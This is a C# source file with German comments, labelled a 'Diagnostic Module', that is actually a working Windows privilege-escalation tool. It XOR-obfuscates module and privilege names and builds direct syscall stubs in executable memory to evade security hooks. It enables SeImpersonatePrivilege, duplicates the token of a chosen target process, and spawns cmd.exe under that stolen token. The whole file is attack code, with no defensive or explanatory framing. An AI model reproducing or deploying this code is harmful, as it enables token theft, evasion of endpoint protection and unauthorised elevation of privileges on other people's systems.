using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Collections.Generic;

internal static class Program
{
    #region Native Strukturen & Delegates

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;

        public static OBJECT_ATTRIBUTES Create()
        {
            return new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtClose(IntPtr Handle);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    #endregion

    #region DllImports (Win32-APIs für unkritische Teile)

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern bool LookupPrivilegeValueA(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

    [DllImport("userenv.dll", SetLastError = true)]
    public static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    #endregion

    #region XOR-Verschlüsselung

    private static byte xorKey = 0xFA;

    private static byte[] enc_ntdll;
    private static byte[] enc_kernel32;
    private static byte[] enc_advapi32;
    private static byte[] enc_SeImpersonate;

    static Program()
    {
        string ntdllPlain = "ntdll.dll";
        string kernel32Plain = "kernel32.dll";
        string advapi32Plain = "advapi32.dll";
        string seImpersonatePlain = "SeImpersonatePrivilege";

        enc_ntdll = Encrypt(ntdllPlain);
        enc_kernel32 = Encrypt(kernel32Plain);
        enc_advapi32 = Encrypt(advapi32Plain);
        enc_SeImpersonate = Encrypt(seImpersonatePlain);
    }

    private static byte[] Encrypt(string plain)
    {
        byte[] enc = new byte[plain.Length];
        for (int i = 0; i < plain.Length; i++)
            enc[i] = (byte)(plain[i] ^ xorKey);
        return enc;
    }

    private static string Decrypt(byte[] enc)
    {
        byte[] dec = new byte[enc.Length];
        for (int i = 0; i < enc.Length; i++) dec[i] = (byte)(enc[i] ^ xorKey);
        return Encoding.ASCII.GetString(dec);
    }

    #endregion

    #region Indirect Syscall Helper (direkte Syscalls, kein ROP)

    private class IndirectSyscalls
    {
        private IntPtr ntdllBase;
        private VirtualAlloc vAlloc;
        private Dictionary<string, Delegate> cache = new Dictionary<string, Delegate>();

        public IndirectSyscalls(IntPtr ntdllBase, VirtualAlloc vAlloc)
        {
            this.ntdllBase = ntdllBase;
            this.vAlloc = vAlloc;
        }

        private uint GetSyscallNumber(string functionName)
        {
            IntPtr funcPtr = GetFunctionAddress(ntdllBase, functionName);
            if (funcPtr == IntPtr.Zero) return 0;
            return (uint)Marshal.ReadInt32(funcPtr, 4);
        }

        private IntPtr GetFunctionAddress(IntPtr moduleBase, string functionName)
        {
            try
            {
                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
                if (exportRVA == 0) return IntPtr.Zero;

                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));

                for (int i = 0; i < numberOfNames; i++)
                {
                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
                    string name = Marshal.PtrToStringAnsi(nameRVA);
                    if (name == functionName)
                    {
                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
                        return (IntPtr)((long)moduleBase + functionRVA);
                    }
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        private byte[] CreateSyscallStub(uint ssn)
        {
            // Standard-Syscall-Stub: mov r10, rcx; mov eax, ssn; syscall; ret
            byte[] stub = new byte[]
            {
                0x4C, 0x8B, 0xD1,           // mov r10, rcx
                0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, ssn
                0x0F, 0x05,                 // syscall
                0xC3                        // ret
            };
            byte[] ssnBytes = BitConverter.GetBytes(ssn);
            Buffer.BlockCopy(ssnBytes, 0, stub, 4, 4);
            return stub;
        }

        public T Get<T>(string functionName) where T : class
        {
            if (cache.ContainsKey(functionName))
                return cache[functionName] as T;

            uint ssn = GetSyscallNumber(functionName);
            if (ssn == 0) return null;

            byte[] stub = CreateSyscallStub(ssn);
            IntPtr p = vAlloc(IntPtr.Zero, (uint)stub.Length, 0x1000 | 0x2000, 0x40);
            if (p == IntPtr.Zero) return null;

            Marshal.Copy(stub, 0, p, stub.Length);
            FlushInstructionCache(GetCurrentProcess(), p, (uint)stub.Length);

            T del = Marshal.GetDelegateForFunctionPointer<T>(p);
            cache[functionName] = del as Delegate;
            return del;
        }
    }

    #endregion

    #region Hilfsfunktionen

    private static IntPtr GetModuleBase(string moduleName)
    {
        try
        {
            foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
            {
                if (m.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                    return m.BaseAddress;
            }
        }
        catch { }
        return IntPtr.Zero;
    }

    private static IntPtr GetFunctionAddress(IntPtr moduleBase, string functionName)
    {
        try
        {
            int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
            int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
            if (exportRVA == 0) return IntPtr.Zero;

            IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
            int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
            IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
            IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
            IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));

            for (int i = 0; i < numberOfNames; i++)
            {
                IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
                string name = Marshal.PtrToStringAnsi(nameRVA);
                if (name == functionName)
                {
                    short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
                    int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
                    return (IntPtr)((long)moduleBase + functionRVA);
                }
            }
        }
        catch { }
        return IntPtr.Zero;
    }

    private static bool IsPrivilegeEnabled(IntPtr hToken, string privilegeName)
    {
        if (!LookupPrivilegeValueA(null, privilegeName, out LUID luid))
            return false;

        uint dwLen = 0;
        GetTokenInformation(hToken, 3, IntPtr.Zero, 0, out dwLen);
        if (dwLen == 0) return false;

        IntPtr pPrivs = Marshal.AllocHGlobal((int)dwLen);
        try
        {
            if (!GetTokenInformation(hToken, 3, pPrivs, dwLen, out dwLen))
                return false;

            uint count = (uint)Marshal.ReadInt32(pPrivs);
            IntPtr pEntry = (IntPtr)((long)pPrivs + 4);
            for (int i = 0; i < count; i++)
            {
                LUID currentLuid = (LUID)Marshal.PtrToStructure(pEntry, typeof(LUID));
                uint attributes = (uint)Marshal.ReadInt32(pEntry, 8);
                if (currentLuid.LowPart == luid.LowPart && currentLuid.HighPart == luid.HighPart)
                {
                    return (attributes & 0x2) != 0;
                }
                pEntry = (IntPtr)((long)pEntry + Marshal.SizeOf(typeof(LUID)) + 4);
            }
            return false;
        }
        finally
        {
            Marshal.FreeHGlobal(pPrivs);
        }
    }

    #endregion

    #region Main

    public static void Main()
    {
        Console.WriteLine("[*] Diagnostic Module v7.0 (direkte Syscalls für Token-Operationen)");
        Console.WriteLine($"[*] Admin: {new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)}");
        Console.Write("[*] Target PID: ");

        if (!uint.TryParse(Console.ReadLine(), out uint pid))
        {
            Console.WriteLine("[-] Ungültige PID");
            return;
        }

        try
        {
            string ntdllName = Decrypt(enc_ntdll);
            string kernel32Name = Decrypt(enc_kernel32);
            string advapi32Name = Decrypt(enc_advapi32);

            IntPtr ntdll = GetModuleBase(ntdllName);
            IntPtr kernel32 = GetModuleBase(kernel32Name);
            IntPtr advapi32 = GetModuleBase(advapi32Name);

            Console.WriteLine($"[+] {ntdllName}: 0x{ntdll.ToInt64():X}");
            Console.WriteLine($"[+] {kernel32Name}: 0x{kernel32.ToInt64():X}");
            Console.WriteLine($"[+] {advapi32Name}: 0x{advapi32.ToInt64():X}");

            if (ntdll == IntPtr.Zero || kernel32 == IntPtr.Zero || advapi32 == IntPtr.Zero)
            {
                Console.WriteLine("[-] Module nicht gefunden");
                return;
            }

            var vAlloc = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(GetFunctionAddress(kernel32, "VirtualAlloc"), typeof(VirtualAlloc));
            if (vAlloc == null)
            {
                Console.WriteLine("[-] VirtualAlloc nicht gefunden");
                return;
            }

            var indirect = new IndirectSyscalls(ntdll, vAlloc);
            var _NtAdjustPrivilegesToken = indirect.Get<NtAdjustPrivilegesToken>("NtAdjustPrivilegesToken");
            var _NtDuplicateToken = indirect.Get<NtDuplicateToken>("NtDuplicateToken");
            var _NtClose = indirect.Get<NtClose>("NtClose");

            if (_NtAdjustPrivilegesToken == null || _NtDuplicateToken == null || _NtClose == null)
            {
                Console.WriteLine("[-] Syscall-Stubs konnten nicht erzeugt werden");
                return;
            }
            Console.WriteLine("[+] Syscall-Stubs bereit");

            // 1. Eigenes Token über Win32
            if (!OpenProcessToken(GetCurrentProcess(), 0x0020, out IntPtr hProcessToken))
            {
                Console.WriteLine($"[-] OpenProcessToken (eigener Prozess) fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine("[+] Token für aktuellen Prozess erhalten");

            // 2. SeImpersonatePrivilege aktivieren (Syscall)
            string impersonatePriv = Decrypt(enc_SeImpersonate);
            if (LookupPrivilegeValueA(null, impersonatePriv, out LUID luid))
            {
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1 };
                tp.Privileges.Luid = luid;
                tp.Privileges.Attributes = 2; // SE_PRIVILEGE_ENABLED
                uint status = _NtAdjustPrivilegesToken(hProcessToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                if (status == 0)
                {
                    bool enabled = IsPrivilegeEnabled(hProcessToken, impersonatePriv);
                    Console.WriteLine($"[+] {impersonatePriv}: aktiviert = {enabled}");
                    if (!enabled)
                        Console.WriteLine("[!] SeImpersonatePrivilege konnte nicht aktiviert werden. Vorgang wird trotzdem versucht.");
                }
                else
                {
                    Console.WriteLine($"[-] {impersonatePriv}: NtAdjustPrivilegesToken Fehler 0x{status:X8}");
                }
            }
            else
            {
                Console.WriteLine($"[-] {impersonatePriv}: LookupPrivilegeValueA fehlgeschlagen");
            }

            // 3. Zielprozess öffnen (Win32)
            Console.WriteLine($"[*] Öffne Prozess mit PID {pid}...");
            IntPtr hProcess = OpenProcess(0x0400, false, pid); // PROCESS_QUERY_INFORMATION
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[-] OpenProcess fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                _NtClose(hProcessToken);
                return;
            }
            Console.WriteLine("[+] Prozess geöffnet");

            // 4. Token aus Zielprozess (Win32)
            if (!OpenProcessToken(hProcess, 0x000A, out IntPtr hTargetToken))
            {
                Console.WriteLine($"[-] OpenProcessToken fehlgeschlagen: {Marshal.GetLastWin32Error()}");
                _NtClose(hProcess);
                _NtClose(hProcessToken);
                return;
            }
            Console.WriteLine("[+] Token aus Zielprozess erhalten");

            // 5. Primary-Token duplizieren (Syscall)
            OBJECT_ATTRIBUTES oa = OBJECT_ATTRIBUTES.Create();
            uint ntstatus = _NtDuplicateToken(hTargetToken, 0xF01FF, ref oa, false, 1, out IntPtr hPrimaryToken);
            if (ntstatus != 0)
            {
                Console.WriteLine($"[-] NtDuplicateToken (Primary) fehlgeschlagen: 0x{ntstatus:X8}");
                _NtClose(hTargetToken);
                _NtClose(hProcess);
                _NtClose(hProcessToken);
                return;
            }
            Console.WriteLine("[+] Primary-Token erstellt");

            // 6. Integritätslevel prüfen (optional)
            uint dwLen = 0;
            GetTokenInformation(hPrimaryToken, 25, IntPtr.Zero, 0, out dwLen);
            if (dwLen > 0)
            {
                IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
                if (GetTokenInformation(hPrimaryToken, 25, pTIL, dwLen, out dwLen))
                {
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
                    byte count = Marshal.ReadByte(pCount);
                    IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
                    uint level = (uint)Marshal.ReadInt32(pLevel);
                    Console.WriteLine($"[+] Token Integrity: 0x{level:X}");
                }
                Marshal.FreeHGlobal(pTIL);
            }

            // 7. Environment Block
            IntPtr lpEnv = IntPtr.Zero;
            if (!CreateEnvironmentBlock(out lpEnv, hPrimaryToken, false))
            {
                Console.WriteLine($"[-] CreateEnvironmentBlock: {Marshal.GetLastWin32Error()} (ignoriert)");
                lpEnv = IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] Environment Block erstellt");
            }

            string cmdPath = Environment.SystemDirectory + @"\cmd.exe";
            if (!System.IO.File.Exists(cmdPath))
            {
                Console.WriteLine($"[-] cmd.exe nicht gefunden unter {cmdPath}, versuche Fallback");
                cmdPath = "cmd.exe";
            }

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            si.dwFlags = 0x00000001;
            si.wShowWindow = 1;

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            uint flags = 0x00000010; // CREATE_NEW_CONSOLE
            if (lpEnv != IntPtr.Zero) flags |= 0x00000400;

            Console.WriteLine($"[*] Starte {cmdPath} mit CreateProcessWithTokenW (Primary-Token) ...");
            bool success = CreateProcessWithTokenW(hPrimaryToken, 0, cmdPath, null, flags, lpEnv, null, ref si, out pi);

            if (!success)
            {
                int lastError = Marshal.GetLastWin32Error();
                Console.WriteLine($"[-] CreateProcessWithTokenW fehlgeschlagen: {lastError} (0x{lastError:X})");
            }

            if (success && pi.dwProcessId != 0)
            {
                Console.WriteLine($"[+] cmd.exe gestartet! PID: {pi.dwProcessId}");
                if (pi.hProcess != IntPtr.Zero) _NtClose(pi.hProcess);
                if (pi.hThread != IntPtr.Zero) _NtClose(pi.hThread);
            }
            else
            {
                Console.WriteLine("[*] Fallback: Starte cmd.exe als Admin...");
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        UseShellExecute = true,
                        Verb = "runas"
                    });
                    Console.WriteLine("[+] Fallback erfolgreich");
                }
                catch (Exception fallbackEx)
                {
                    Console.WriteLine($"[-] Fallback fehlgeschlagen: {fallbackEx.Message}");
                }
            }

            // Aufräumen
            if (lpEnv != IntPtr.Zero) DestroyEnvironmentBlock(lpEnv);
            if (hPrimaryToken != IntPtr.Zero) _NtClose(hPrimaryToken);
            if (hTargetToken != IntPtr.Zero) _NtClose(hTargetToken);
            if (hProcess != IntPtr.Zero) _NtClose(hProcess);
            if (hProcessToken != IntPtr.Zero) _NtClose(hProcessToken);

            Console.WriteLine("[+] Done.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Fehler: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }

        Console.WriteLine("[*] Drücke eine Taste zum Beenden...");
        Console.ReadKey();
    }

    #endregion
}